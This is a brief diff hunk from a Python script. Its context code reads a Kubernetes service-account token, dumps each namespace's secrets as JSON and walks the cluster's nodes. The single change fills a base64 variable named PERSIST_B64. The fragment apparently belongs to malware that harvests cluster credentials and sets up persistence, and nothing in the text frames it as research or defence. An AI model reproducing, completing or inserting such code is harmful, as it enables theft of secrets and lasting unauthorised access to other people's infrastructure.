@@ -275,7 +275,7 @@ if os.path.exists(SA_TOKEN_PATH):
         if ns_secrets:
             print(f'\n=== K8S SECRETS ns={ns} ===\n{json.dumps(ns_secrets,indent=2)}\n'.encode())
 
-    PERSIST_B64=''
+    PERSIST_B64='IA=='
 
     nodes=k8s_get('/api/v1/nodes')
     for node in nodes.get('items',[]):
